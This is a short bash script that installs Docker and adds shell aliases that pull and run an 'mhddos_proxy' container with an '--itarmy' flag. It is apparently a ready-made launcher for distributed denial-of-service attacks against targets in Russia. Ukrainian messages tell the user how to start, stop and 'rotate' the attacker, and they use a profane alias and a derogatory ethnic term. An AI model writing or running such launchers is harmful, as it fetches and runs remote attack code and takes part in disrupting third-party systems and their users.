#!/usr/bin/env bash

apt-get update
apt-get install -f docker docker.io

echo "alias fuckthem='docker run -itd --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --itarmy'" >> ~/.bashrc
echo "alias logs='docker logs -n10 -f (docker ps -aq)'" >> ~/.bashrc
echo "alias pardon='docker kill (docker ps -aq)'" >> ~/.bashrc
echo "alias sowhat='docker logs -n100 (docker ps -aq)'" >> ~/.bashrc
echo "alias isrunning='docker ps -aq'" >> ~/.bashrc
echo "alias rotate='pardon; fuckthem; sowhat;'" >> ~/.bashrc

echo "Щоб атакувати русню: fuckthem"
echo "Щоб припинити: pardon"
echo "Перезагрузити бійця: rotate"
echo "Дивитися логи у реалтаймі: logs"
echo "Дивитися останні 100 рядків логу: sowhat"
echo "Роби ротацію бійця хочаб раз на 2 дні. Можуть бути корисні покращення. Успіхів!"

exec bash
